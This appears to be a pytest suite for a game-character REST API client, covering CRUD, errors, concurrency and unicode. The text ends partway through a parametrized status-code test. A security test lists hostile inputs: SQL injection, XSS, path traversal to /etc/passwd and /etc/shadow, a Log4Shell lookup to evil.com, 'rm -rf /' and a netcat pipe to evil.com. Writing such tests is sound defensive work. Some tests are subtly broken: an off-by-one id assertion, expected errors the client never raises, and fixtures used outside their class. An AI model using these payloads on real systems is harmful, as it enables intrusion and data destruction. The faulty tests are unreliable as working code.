import pytest
from unittest.mock import Mock, patch, MagicMock, call
import json
import requests
from requests.exceptions import RequestException, Timeout, ConnectionError, HTTPError
import sys
import os
from typing import Dict, List, Optional, Union

# Add the parent directory to the path to import CharacterClient
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

try:
    from character_client import CharacterClient
except ImportError:
    # Create a mock CharacterClient class for testing purposes if the actual implementation is not available
    class CharacterClient:
        def __init__(self, base_url: str = "https://api.character.com", api_key: str = None, timeout: int = 30):
            self.base_url = base_url.rstrip('/')
            self.api_key = api_key
            self.timeout = timeout
            self.session = requests.Session()
            if api_key:
                self.session.headers.update({"Authorization": f"Bearer {api_key}"})

        def get_character(self, character_id: int) -> Dict:
            response = self.session.get(f"{self.base_url}/characters/{character_id}", timeout=self.timeout)
            response.raise_for_status()
            return response.json()

        def get_all_characters(self, page: int = 1, limit: int = 20) -> List[Dict]:
            params = {"page": page, "limit": limit}
            response = self.session.get(f"{self.base_url}/characters", params=params, timeout=self.timeout)
            response.raise_for_status()
            return response.json()

        def create_character(self, character_data: Dict) -> Dict:
            if not character_data or not isinstance(character_data, dict):
                raise ValueError("Invalid character data")
            response = self.session.post(f"{self.base_url}/characters", json=character_data, timeout=self.timeout)
            response.raise_for_status()
            return response.json()

        def update_character(self, character_id: int, update_data: Dict) -> Dict:
            if not isinstance(character_id, int) or character_id <= 0:
                raise ValueError("Invalid character ID")
            if not update_data or not isinstance(update_data, dict):
                raise ValueError("Invalid update data")
            response = self.session.put(f"{self.base_url}/characters/{character_id}", json=update_data, timeout=self.timeout)
            response.raise_for_status()
            return response.json()

        def delete_character(self, character_id: int) -> bool:
            if not isinstance(character_id, int) or character_id <= 0:
                raise ValueError("Invalid character ID")
            response = self.session.delete(f"{self.base_url}/characters/{character_id}", timeout=self.timeout)
            response.raise_for_status()
            return response.status_code == 204

        def search_characters(self, name: str = None, character_class: str = None, level_min: int = None, level_max: int = None) -> List[Dict]:
            if not any([name, character_class, level_min, level_max]):
                raise ValueError("At least one search criterion must be provided")
            params = {}
            if name:
                params["name"] = name
            if character_class:
                params["class"] = character_class
            if level_min:
                params["level_min"] = level_min
            if level_max:
                params["level_max"] = level_max
            response = self.session.get(f"{self.base_url}/characters/search", params=params, timeout=self.timeout)
            response.raise_for_status()
            return response.json()


class TestCharacterClient:
    """
    Comprehensive test suite for CharacterClient.
    Testing framework: pytest
    """

    @pytest.fixture
    def client(self):
        """Fixture to create a CharacterClient instance for testing."""
        return CharacterClient(base_url="https://api.test.com", api_key="test_api_key")

    @pytest.fixture
    def sample_character(self):
        """Fixture providing sample character data."""
        return {
            "id": 1,
            "name": "Test Warrior",
            "level": 10,
            "class": "Warrior",
            "health": 100,
            "mana": 50,
            "experience": 2500,
            "stats": {
                "strength": 15,
                "dexterity": 12,
                "intelligence": 8,
                "constitution": 14
            }
        }

    @pytest.fixture
    def sample_characters_list(self, sample_character):
        """Fixture providing a list of sample characters."""
        return [
            sample_character,
            {
                "id": 2,
                "name": "Test Mage",
                "level": 15,
                "class": "Mage",
                "health": 80,
                "mana": 120,
                "experience": 5000,
                "stats": {
                    "strength": 8,
                    "dexterity": 10,
                    "intelligence": 18,
                    "constitution": 10
                }
            }
        ]

    # Initialization Tests
    def test_init_default_parameters(self):
        """Test CharacterClient initialization with default parameters."""
        client = CharacterClient()
        assert isinstance(client, CharacterClient)
        assert client.base_url == "https://api.character.com"
        assert client.api_key is None
        assert client.timeout == 30

    def test_init_custom_parameters(self):
        """Test CharacterClient initialization with custom parameters."""
        base_url = "https://custom.api.com"
        api_key = "custom_key"
        timeout = 60
        
        client = CharacterClient(base_url=base_url, api_key=api_key, timeout=timeout)
        
        assert client.base_url == base_url
        assert client.api_key == api_key
        assert client.timeout == timeout

    def test_init_with_trailing_slash_in_url(self):
        """Test CharacterClient initialization strips trailing slash from URL."""
        client = CharacterClient(base_url="https://api.test.com/")
        assert client.base_url == "https://api.test.com"

    def test_init_sets_authorization_header_when_api_key_provided(self):
        """Test that authorization header is set when API key is provided."""
        api_key = "test_key"
        client = CharacterClient(api_key=api_key)
        assert "Authorization" in client.session.headers
        assert client.session.headers["Authorization"] == f"Bearer {api_key}"

    # Happy Path Tests - Character CRUD Operations
    @patch('requests.Session.get')
    def test_get_character_success(self, mock_get, client, sample_character):
        """Test successful character retrieval."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = sample_character
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.get_character(1)
        
        assert result == sample_character
        mock_get.assert_called_once_with("https://api.test.com/characters/1", timeout=30)

    @patch('requests.Session.get')
    def test_get_all_characters_success(self, mock_get, client, sample_characters_list):
        """Test successful retrieval of all characters."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = sample_characters_list
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.get_all_characters()
        
        assert result == sample_characters_list
        assert len(result) == 2
        mock_get.assert_called_once_with(
            "https://api.test.com/characters", 
            params={"page": 1, "limit": 20}, 
            timeout=30
        )

    @patch('requests.Session.get')
    def test_get_all_characters_with_pagination(self, mock_get, client, sample_characters_list):
        """Test character retrieval with custom pagination parameters."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = sample_characters_list
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.get_all_characters(page=2, limit=50)
        
        assert result == sample_characters_list
        mock_get.assert_called_once_with(
            "https://api.test.com/characters", 
            params={"page": 2, "limit": 50}, 
            timeout=30
        )

    @patch('requests.Session.post')
    def test_create_character_success(self, mock_post, client, sample_character):
        """Test successful character creation."""
        mock_response = Mock()
        mock_response.status_code = 201
        mock_response.json.return_value = sample_character
        mock_response.raise_for_status.return_value = None
        mock_post.return_value = mock_response

        character_data = {
            "name": "New Character",
            "class": "Rogue",
            "level": 1
        }
        
        result = client.create_character(character_data)
        
        assert result == sample_character
        mock_post.assert_called_once_with(
            "https://api.test.com/characters", 
            json=character_data, 
            timeout=30
        )

    @patch('requests.Session.put')
    def test_update_character_success(self, mock_put, client, sample_character):
        """Test successful character update."""
        updated_character = sample_character.copy()
        updated_character["level"] = 11
        
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = updated_character
        mock_response.raise_for_status.return_value = None
        mock_put.return_value = mock_response

        update_data = {"level": 11}
        result = client.update_character(1, update_data)
        
        assert result == updated_character
        mock_put.assert_called_once_with(
            "https://api.test.com/characters/1", 
            json=update_data, 
            timeout=30
        )

    @patch('requests.Session.delete')
    def test_delete_character_success(self, mock_delete, client):
        """Test successful character deletion."""
        mock_response = Mock()
        mock_response.status_code = 204
        mock_response.raise_for_status.return_value = None
        mock_delete.return_value = mock_response

        result = client.delete_character(1)
        
        assert result is True
        mock_delete.assert_called_once_with("https://api.test.com/characters/1", timeout=30)

    # Edge Cases and Error Handling Tests
    @patch('requests.Session.get')
    def test_get_character_not_found(self, mock_get, client):
        """Test character retrieval when character doesn't exist."""
        mock_response = Mock()
        mock_response.status_code = 404
        mock_response.raise_for_status.side_effect = HTTPError("404 Client Error: Not Found")
        mock_get.return_value = mock_response

        with pytest.raises(HTTPError, match="404 Client Error"):
            client.get_character(999)

    @patch('requests.Session.get')
    def test_get_character_server_error(self, mock_get, client):
        """Test character retrieval with server error."""
        mock_response = Mock()
        mock_response.status_code = 500
        mock_response.raise_for_status.side_effect = HTTPError("500 Server Error")
        mock_get.return_value = mock_response

        with pytest.raises(HTTPError, match="500 Server Error"):
            client.get_character(1)

    @patch('requests.Session.get')
    def test_get_character_timeout(self, mock_get, client):
        """Test character retrieval with timeout."""
        mock_get.side_effect = Timeout("Request timed out")

        with pytest.raises(Timeout, match="Request timed out"):
            client.get_character(1)

    @patch('requests.Session.get')
    def test_get_character_connection_error(self, mock_get, client):
        """Test character retrieval with connection error."""
        mock_get.side_effect = ConnectionError("Connection failed")

        with pytest.raises(ConnectionError, match="Connection failed"):
            client.get_character(1)

    @patch('requests.Session.get')
    def test_get_character_invalid_json(self, mock_get, client):
        """Test character retrieval with invalid JSON response."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.side_effect = json.JSONDecodeError("Invalid JSON", "", 0)
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        with pytest.raises(json.JSONDecodeError):
            client.get_character(1)

    @pytest.mark.parametrize("invalid_id", [None, "", "invalid", -1, 0, [], {}, 0.5])
    def test_get_character_invalid_id_types(self, client, invalid_id):
        """Test character retrieval with invalid ID types."""
        with pytest.raises((TypeError, ValueError)):
            client.get_character(invalid_id)

    @pytest.mark.parametrize("invalid_data", [
        None,
        "",
        [],
        {"name": ""},  # Empty name
        {"name": None},  # None name
        {},  # Empty dict
    ])
    def test_create_character_invalid_data(self, client, invalid_data):
        """Test character creation with invalid data."""
        with pytest.raises(ValueError, match="Invalid character data"):
            client.create_character(invalid_data)

    @patch('requests.Session.post')
    def test_create_character_validation_error(self, mock_post, client):
        """Test character creation with validation error from server."""
        mock_response = Mock()
        mock_response.status_code = 400
        mock_response.raise_for_status.side_effect = HTTPError("400 Bad Request: Validation Error")
        mock_post.return_value = mock_response

        character_data = {"name": "Invalid Character"}
        
        with pytest.raises(HTTPError, match="400 Bad Request"):
            client.create_character(character_data)

    @pytest.mark.parametrize("char_id,update_data", [
        (None, {"level": 10}),
        ("invalid", {"level": 10}),
        (-1, {"level": 10}),
        (0, {"level": 10}),
        (1, None),
        (1, ""),
        (1, []),
        (1, {}),
    ])
    def test_update_character_invalid_parameters(self, client, char_id, update_data):
        """Test character update with invalid parameters."""
        with pytest.raises(ValueError):
            client.update_character(char_id, update_data)

    @pytest.mark.parametrize("char_id", [None, "invalid", -1, 0, [], {}, 0.5])
    def test_delete_character_invalid_id(self, client, char_id):
        """Test character deletion with invalid ID."""
        with pytest.raises(ValueError, match="Invalid character ID"):
            client.delete_character(char_id)

    # Authentication and Authorization Tests
    @patch('requests.Session.get')
    def test_get_character_unauthorized(self, mock_get, client):
        """Test character retrieval with unauthorized access."""
        mock_response = Mock()
        mock_response.status_code = 401
        mock_response.raise_for_status.side_effect = HTTPError("401 Unauthorized")
        mock_get.return_value = mock_response

        with pytest.raises(HTTPError, match="401 Unauthorized"):
            client.get_character(1)

    @patch('requests.Session.get')
    def test_get_character_forbidden(self, mock_get, client):
        """Test character retrieval with forbidden access."""
        mock_response = Mock()
        mock_response.status_code = 403
        mock_response.raise_for_status.side_effect = HTTPError("403 Forbidden")
        mock_get.return_value = mock_response

        with pytest.raises(HTTPError, match="403 Forbidden"):
            client.get_character(1)

    # Rate Limiting Tests
    @patch('requests.Session.get')
    def test_get_character_rate_limited(self, mock_get, client):
        """Test character retrieval with rate limiting."""
        mock_response = Mock()
        mock_response.status_code = 429
        mock_response.raise_for_status.side_effect = HTTPError("429 Too Many Requests")
        mock_get.return_value = mock_response

        with pytest.raises(HTTPError, match="429 Too Many Requests"):
            client.get_character(1)

    # Search and Filter Tests
    @patch('requests.Session.get')
    def test_search_characters_by_name(self, mock_get, client, sample_character):
        """Test character search by name."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = [sample_character]
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.search_characters(name="Test")
        
        assert len(result) == 1
        assert result[0]["name"] == "Test Warrior"
        mock_get.assert_called_once_with(
            "https://api.test.com/characters/search", 
            params={"name": "Test"}, 
            timeout=30
        )

    @patch('requests.Session.get')
    def test_search_characters_by_class(self, mock_get, client, sample_character):
        """Test character search by class."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = [sample_character]
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.search_characters(character_class="Warrior")
        
        assert len(result) == 1
        assert result[0]["class"] == "Warrior"
        mock_get.assert_called_once_with(
            "https://api.test.com/characters/search", 
            params={"class": "Warrior"}, 
            timeout=30
        )

    @patch('requests.Session.get')
    def test_search_characters_by_level_range(self, mock_get, client, sample_character):
        """Test character search by level range."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = [sample_character]
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.search_characters(level_min=5, level_max=15)
        
        assert len(result) == 1
        assert result[0]["level"] == 10
        mock_get.assert_called_once_with(
            "https://api.test.com/characters/search", 
            params={"level_min": 5, "level_max": 15}, 
            timeout=30
        )

    @patch('requests.Session.get')
    def test_search_characters_multiple_criteria(self, mock_get, client, sample_character):
        """Test character search with multiple criteria."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = [sample_character]
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.search_characters(name="Test", character_class="Warrior", level_min=5)
        
        assert len(result) == 1
        mock_get.assert_called_once_with(
            "https://api.test.com/characters/search", 
            params={"name": "Test", "class": "Warrior", "level_min": 5}, 
            timeout=30
        )

    def test_search_characters_no_criteria(self, client):
        """Test character search without search criteria."""
        with pytest.raises(ValueError, match="At least one search criterion must be provided"):
            client.search_characters()

    @patch('requests.Session.get')
    def test_search_characters_empty_results(self, mock_get, client):
        """Test character search with no matching results."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = []
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.search_characters(name="NonexistentCharacter")
        
        assert result == []
        assert len(result) == 0

    # Performance and Load Tests
    @patch('requests.Session.get')
    def test_get_all_characters_large_page_size(self, mock_get, client):
        """Test character retrieval with large page size."""
        large_characters_list = [{"id": i, "name": f"Character {i}"} for i in range(1000)]
        
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = large_characters_list
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.get_all_characters(page=1, limit=1000)
        
        assert len(result) == 1000
        assert result[0]["id"] == 1
        assert result[999]["id"] == 1000

    # Configuration Tests
    def test_custom_timeout_configuration(self):
        """Test CharacterClient with custom timeout configuration."""
        client = CharacterClient(timeout=60)
        assert client.timeout == 60

    @patch('requests.Session.get')
    def test_timeout_passed_to_requests(self, mock_get, sample_character):
        """Test that timeout is correctly passed to requests."""
        client = CharacterClient(timeout=45)
        
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = sample_character
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        client.get_character(1)
        
        mock_get.assert_called_once_with("https://api.character.com/characters/1", timeout=45)

    # Error Recovery Tests
    @patch('requests.Session.get')
    def test_get_character_with_retry_logic(self, mock_get, client, sample_character):
        """Test character retrieval with simulated retry logic."""
        # First call fails, second succeeds
        mock_response_fail = Mock()
        mock_response_fail.raise_for_status.side_effect = HTTPError("500 Server Error")
        
        mock_response_success = Mock()
        mock_response_success.status_code = 200
        mock_response_success.json.return_value = sample_character
        mock_response_success.raise_for_status.return_value = None
        
        mock_get.side_effect = [mock_response_fail, mock_response_success]

        # First call should fail
        with pytest.raises(HTTPError):
            client.get_character(1)
        
        # Second call should succeed
        result = client.get_character(1)
        assert result == sample_character
        assert mock_get.call_count == 2

    # Data Validation Tests
    def test_create_character_validates_required_fields(self, client):
        """Test that character creation validates required fields."""
        # Test with missing required fields
        incomplete_data = {"level": 1}  # Missing name and class
        
        with pytest.raises(ValueError):
            client.create_character(incomplete_data)

    @patch('requests.Session.post')
    def test_create_character_with_complete_data(self, mock_post, client, sample_character):
        """Test character creation with complete valid data."""
        mock_response = Mock()
        mock_response.status_code = 201
        mock_response.json.return_value = sample_character
        mock_response.raise_for_status.return_value = None
        mock_post.return_value = mock_response

        complete_character_data = {
            "name": "Complete Character",
            "class": "Paladin",
            "level": 1,
            "stats": {
                "strength": 14,
                "dexterity": 10,
                "intelligence": 12,
                "constitution": 13
            }
        }
        
        result = client.create_character(complete_character_data)
        
        assert result == sample_character
        mock_post.assert_called_once_with(
            "https://api.test.com/characters", 
            json=complete_character_data, 
            timeout=30
        )

    # Boundary Value Tests
    @pytest.mark.parametrize("level", [1, 50, 100])
    def test_search_characters_level_boundaries(self, client, level):
        """Test character search with boundary level values."""
        with patch('requests.Session.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = []
            mock_response.raise_for_status.return_value = None
            mock_get.return_value = mock_response

            result = client.search_characters(level_min=level, level_max=level)
            
            assert result == []
            assert mock_get.called

    # Integration-style Tests
    @patch('requests.Session.post')
    @patch('requests.Session.get')
    def test_create_then_retrieve_character(self, mock_get, mock_post, client, sample_character):
        """Test creating a character and then retrieving it."""
        # Mock character creation
        mock_post_response = Mock()
        mock_post_response.status_code = 201
        mock_post_response.json.return_value = sample_character
        mock_post_response.raise_for_status.return_value = None
        mock_post.return_value = mock_post_response

        # Mock character retrieval
        mock_get_response = Mock()
        mock_get_response.status_code = 200
        mock_get_response.json.return_value = sample_character
        mock_get_response.raise_for_status.return_value = None
        mock_get.return_value = mock_get_response

        # Create character
        character_data = {"name": "New Character", "class": "Rogue", "level": 1}
        created_character = client.create_character(character_data)
        
        # Retrieve the created character
        retrieved_character = client.get_character(created_character["id"])
        
        assert created_character == sample_character
        assert retrieved_character == sample_character
        assert created_character["id"] == retrieved_character["id"]


# Test Configuration and Fixtures for pytest
class TestCharacterClientConfiguration:
    """Test class for CharacterClient configuration and setup."""

    def test_session_is_configured(self):
        """Test that the session is properly configured."""
        client = CharacterClient(api_key="test_key")
        assert hasattr(client, 'session')
        assert isinstance(client.session, requests.Session)

    def test_session_headers_with_api_key(self):
        """Test that session headers are set correctly with API key."""
        api_key = "test_api_key"
        client = CharacterClient(api_key=api_key)
        assert "Authorization" in client.session.headers
        assert client.session.headers["Authorization"] == f"Bearer {api_key}"

    def test_session_headers_without_api_key(self):
        """Test that session headers are correct without API key."""
        client = CharacterClient()
        assert "Authorization" not in client.session.headers


if __name__ == '__main__':
    pytest.main([__file__, '-v'])

# ================================================================================================
# ADDITIONAL COMPREHENSIVE TEST COVERAGE - ADVANCED SCENARIOS
# Testing Framework: pytest with extensive mocking and parameterization
# ================================================================================================

class TestCharacterClientAdvancedScenarios:
    """
    Advanced test scenarios for CharacterClient focusing on edge cases, concurrency,
    performance, security, and complex error scenarios.
    Testing framework: pytest
    """

    @pytest.fixture
    def client_with_custom_session(self):
        """Fixture to create a CharacterClient with custom session configuration."""
        client = CharacterClient(base_url="https://api.test.com", api_key="test_key")
        # Simulate custom session configuration
        client.session.headers.update({
            "User-Agent": "CharacterClient-Test/1.0",
            "Accept-Language": "en-US,en;q=0.9"
        })
        return client

    @pytest.fixture
    def stress_test_data(self):
        """Fixture providing large datasets for stress testing."""
        return {
            "large_character_list": [
                {
                    "id": i,
                    "name": f"StressTest Character {i}",
                    "class": ["Warrior", "Mage", "Rogue", "Paladin"][i % 4],
                    "level": (i % 100) + 1,
                    "stats": {
                        "strength": (i % 20) + 5,
                        "dexterity": (i % 20) + 5,
                        "intelligence": (i % 20) + 5,
                        "constitution": (i % 20) + 5
                    }
                }
                for i in range(1, 1001)  # 1000 characters
            ],
            "deep_nested_character": {
                "id": 1,
                "name": "Deeply Nested Character",
                "inventory": {
                    "weapons": {
                        "primary": {
                            "name": "Legendary Sword",
                            "enchantments": {
                                "fire": {"damage": 10, "duration": 5},
                                "ice": {"damage": 8, "slow": True}
                            }
                        }
                    }
                },
                "guilds": [
                    {"name": f"Guild {i}", "rank": f"Rank {i}", "members": list(range(100))}
                    for i in range(50)
                ]
            }
        }

    # =============================================================================================
    # CONCURRENCY AND THREAD SAFETY TESTS
    # =============================================================================================

    @patch('requests.Session.get')
    def test_concurrent_character_requests_thread_safety(self, mock_get, client, sample_character):
        """Test thread safety with high concurrency character requests."""
        import threading
        import time
        from concurrent.futures import ThreadPoolExecutor
        
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = sample_character
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        results = []
        errors = []
        
        def fetch_character(char_id):
            try:
                start_time = time.time()
                result = client.get_character(char_id)
                end_time = time.time()
                results.append({
                    "character": result,
                    "duration": end_time - start_time,
                    "thread_id": threading.current_thread().ident
                })
            except Exception as e:
                errors.append((char_id, e, threading.current_thread().ident))

        # Test with 50 concurrent threads
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(fetch_character, i) for i in range(1, 101)]
            for future in futures:
                future.result()  # Wait for completion

        # Verify results
        assert len(results) == 100
        assert len(errors) == 0
        assert len(set(r["thread_id"] for r in results)) > 1  # Multiple threads used
        assert mock_get.call_count == 100

    @patch('requests.Session.post')
    @patch('requests.Session.get')
    def test_mixed_operations_concurrency(self, mock_get, mock_post, client, sample_character):
        """Test concurrent mixed operations (create, read, update)."""
        import threading
        from concurrent.futures import ThreadPoolExecutor, as_completed
        
        # Setup mocks
        mock_get_response = Mock()
        mock_get_response.status_code = 200
        mock_get_response.json.return_value = sample_character
        mock_get_response.raise_for_status.return_value = None
        mock_get.return_value = mock_get_response

        mock_post_response = Mock()
        mock_post_response.status_code = 201
        mock_post_response.json.return_value = sample_character
        mock_post_response.raise_for_status.return_value = None
        mock_post.return_value = mock_post_response

        operations_completed = []
        operation_errors = []

        def perform_operations(operation_id):
            try:
                # Create a character
                create_result = client.create_character({
                    "name": f"Concurrent Character {operation_id}",
                    "class": "Warrior"
                })
                operations_completed.append(f"create_{operation_id}")
                
                # Read characters
                read_result = client.get_character(operation_id)
                operations_completed.append(f"read_{operation_id}")
                
                return {"create": create_result, "read": read_result}
            except Exception as e:
                operation_errors.append((operation_id, str(e)))
                raise

        # Execute 20 concurrent mixed operations
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(perform_operations, i) for i in range(1, 21)]
            results = []
            for future in as_completed(futures):
                try:
                    results.append(future.result())
                except Exception as e:
                    operation_errors.append(("future", str(e)))

        # Verify all operations completed successfully
        assert len(results) == 20
        assert len(operation_errors) == 0
        assert len(operations_completed) == 40  # 20 creates + 20 reads

    # =============================================================================================
    # UNICODE, ENCODING, AND INTERNATIONALIZATION TESTS  
    # =============================================================================================

    @pytest.mark.parametrize("unicode_name,expected_class", [
        ("龍の戦士", "Samurai"),  # Japanese
        ("Señor Héroe", "Paladin"),  # Spanish with accents
        ("Рыцарь Света", "Knight"),  # Russian Cyrillic
        ("🗡️⚔️ Warrior", "Fighter"),  # Emoji characters
        ("Åse Bjørn", "Viking"),  # Nordic characters
        ("محارب الصحراء", "Desert Warrior"),  # Arabic
        ("Ελληνικός ήρωας", "Greek Hero"),  # Greek
    ])
    @patch('requests.Session.post')
    def test_unicode_character_creation(self, mock_post, client, unicode_name, expected_class):
        """Test character creation with various Unicode character sets."""
        unicode_character = {
            "id": 1,
            "name": unicode_name,
            "class": expected_class,
            "level": 1
        }
        
        mock_response = Mock()
        mock_response.status_code = 201
        mock_response.json.return_value = unicode_character
        mock_response.raise_for_status.return_value = None
        mock_post.return_value = mock_response

        character_data = {"name": unicode_name, "class": expected_class, "level": 1}
        result = client.create_character(character_data)
        
        assert result["name"] == unicode_name
        assert result["class"] == expected_class
        mock_post.assert_called_once()

    @patch('requests.Session.get')
    def test_search_with_complex_unicode_queries(self, mock_get, client):
        """Test character search with complex Unicode search queries."""
        unicode_results = [
            {"id": 1, "name": "Drácula", "class": "Vampire"},
            {"id": 2, "name": "Fürst", "class": "Noble"},
            {"id": 3, "name": "Ætheling", "class": "Royal"}
        ]
        
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = unicode_results
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        # Test with various Unicode search patterns
        unicode_queries = [
            "Drác",  # Partial match with accent
            "ür",    # German umlaut
            "Æ",     # Old English character
        ]

        for query in unicode_queries:
            result = client.search_characters(name=query)
            assert isinstance(result, list)
            assert len(result) == 3

    # =============================================================================================
    # PERFORMANCE AND STRESS TESTING
    # =============================================================================================

    @patch('requests.Session.get')
    def test_large_response_handling(self, mock_get, client, stress_test_data):
        """Test handling of very large API responses."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = stress_test_data["large_character_list"]
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        import time
        start_time = time.time()
        result = client.get_all_characters(limit=1000)
        end_time = time.time()
        
        # Verify large response handling
        assert len(result) == 1000
        assert result[0]["id"] == 1
        assert result[999]["id"] == 1000
        
        # Performance should be reasonable even for large responses
        processing_time = end_time - start_time
        assert processing_time < 5.0  # Should process within 5 seconds

    @patch('requests.Session.get')
    def test_deeply_nested_data_handling(self, mock_get, client, stress_test_data):
        """Test handling of deeply nested character data structures."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = stress_test_data["deep_nested_character"]
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.get_character(1)
        
        # Verify deep nesting is preserved
        assert result["inventory"]["weapons"]["primary"]["name"] == "Legendary Sword"
        assert result["inventory"]["weapons"]["primary"]["enchantments"]["fire"]["damage"] == 10
        assert len(result["guilds"]) == 50
        assert len(result["guilds"][0]["members"]) == 100

    @patch('requests.Session.get')
    def test_rapid_sequential_requests_performance(self, mock_get, client, sample_character):
        """Test performance characteristics of rapid sequential requests."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = sample_character
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        import time
        
        # Measure time for 500 rapid requests
        start_time = time.time()
        results = []
        for i in range(500):
            result = client.get_character(i + 1)
            results.append(result)
        end_time = time.time()
        
        # Verify results and performance
        assert len(results) == 500
        assert all(r == sample_character for r in results)
        
        total_time = end_time - start_time
        avg_time_per_request = total_time / 500
        
        # Performance expectations (these should be very fast with mocks)
        assert total_time < 10.0  # Total time under 10 seconds
        assert avg_time_per_request < 0.02  # Average under 20ms per request

    # =============================================================================================
    # SECURITY AND INPUT VALIDATION TESTS
    # =============================================================================================

    @pytest.mark.parametrize("malicious_payload", [
        # SQL Injection attempts
        {"name": "'; DROP TABLE characters; --"},
        {"name": "admin'--"},
        {"name": "' OR '1'='1"},
        {"class": "' UNION SELECT * FROM users --"},
        
        # XSS attempts
        {"name": "<script>alert('xss')</script>"},
        {"description": "<img src=x onerror=alert('xss')>"},
        {"class": "javascript:alert('xss')"},
        
        # Path traversal attempts
        {"name": "../../../etc/passwd"},
        {"avatar_url": "file:///etc/shadow"},
        
        # Template injection attempts
        {"name": "{{7*7}}"},
        {"description": "${jndi:ldap://evil.com/a}"},
        {"class": "#{7*7}"},
        
        # Command injection attempts
        {"name": "; rm -rf /"},
        {"description": "| nc evil.com 4444"},
        
        # XXE attempts
        {"bio": "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"},
        
        # Buffer overflow attempts
        {"name": "A" * 10000},
        {"description": "B" * 50000},
    ])
    @patch('requests.Session.post')
    def test_malicious_input_sanitization(self, mock_post, client, malicious_payload):
        """Test that malicious inputs are handled safely without causing security issues."""
        # Mock server response (assuming server handles sanitization)
        sanitized_payload = {k: f"SANITIZED_{v}" if isinstance(v, str) else v for k, v in malicious_payload.items()}
        sanitized_payload["id"] = 1
        
        mock_response = Mock()
        mock_response.status_code = 201
        mock_response.json.return_value = sanitized_payload
        mock_response.raise_for_status.return_value = None
        mock_post.return_value = mock_response

        # Should not crash or cause security issues
        try:
            result = client.create_character(malicious_payload)
            assert result["id"] == 1
            # Verify the request was made (client doesn't crash)
            mock_post.assert_called_once()
        except (ValueError, TypeError) as e:
            # Acceptable to reject obviously invalid input
            assert "Invalid" in str(e)

    @pytest.mark.parametrize("oversized_data", [
        {"name": "X" * 1000000},  # 1MB name
        {"description": "Y" * 5000000},  # 5MB description
        {"inventory": [{"item": f"item_{i}"} for i in range(100000)]},  # 100k items
    ])
    def test_oversized_data_handling(self, client, oversized_data):
        """Test handling of oversized data that could cause memory issues."""
        with patch('requests.Session.post') as mock_post:
            # Mock a server response or error for oversized data
            mock_response = Mock()
            mock_response.status_code = 413  # Payload Too Large
            mock_response.raise_for_status.side_effect = HTTPError("413 Payload Too Large")
            mock_post.return_value = mock_response

            with pytest.raises(HTTPError, match="413"):
                client.create_character(oversized_data)

    # =============================================================================================
    # NETWORK ERROR SIMULATION AND RECOVERY TESTS
    # =============================================================================================

    @pytest.mark.parametrize("network_error", [
        ConnectionError("Network is unreachable"),
        Timeout("Read timeout"),
        requests.exceptions.ChunkedEncodingError("Connection broken: Invalid chunk encoding"),
        requests.exceptions.SSLError("SSL certificate verification failed"),
        requests.exceptions.ProxyError("Proxy error"),
        requests.exceptions.TooManyRedirects("Too many redirects"),
        requests.exceptions.ContentDecodingError("Failed to decode response content"),
    ])
    @patch('requests.Session.get')
    def test_comprehensive_network_error_handling(self, mock_get, client, network_error):
        """Test handling of various network-related errors."""
        mock_get.side_effect = network_error
        
        with pytest.raises(type(network_error)):
            client.get_character(1)

    @patch('requests.Session.get')
    def test_intermittent_network_failures(self, mock_get, client, sample_character):
        """Test behavior with intermittent network failures."""
        # Simulate intermittent failures: fail, succeed, fail, succeed
        failure = ConnectionError("Intermittent failure")
        success_response = Mock()
        success_response.status_code = 200
        success_response.json.return_value = sample_character
        success_response.raise_for_status.return_value = None
        
        mock_get.side_effect = [failure, success_response, failure, success_response]
        
        # First request fails
        with pytest.raises(ConnectionError):
            client.get_character(1)
        
        # Second request succeeds
        result = client.get_character(1)
        assert result == sample_character
        
        # Third request fails again
        with pytest.raises(ConnectionError):
            client.get_character(1)
        
        # Fourth request succeeds again
        result = client.get_character(1)
        assert result == sample_character

    # =============================================================================================
    # HTTP PROTOCOL AND STATUS CODE EDGE CASES
    # =============================================================================================

    @pytest.mark.parametrize("status_code,error_class", [
        (100, HTTPError),  # Continue
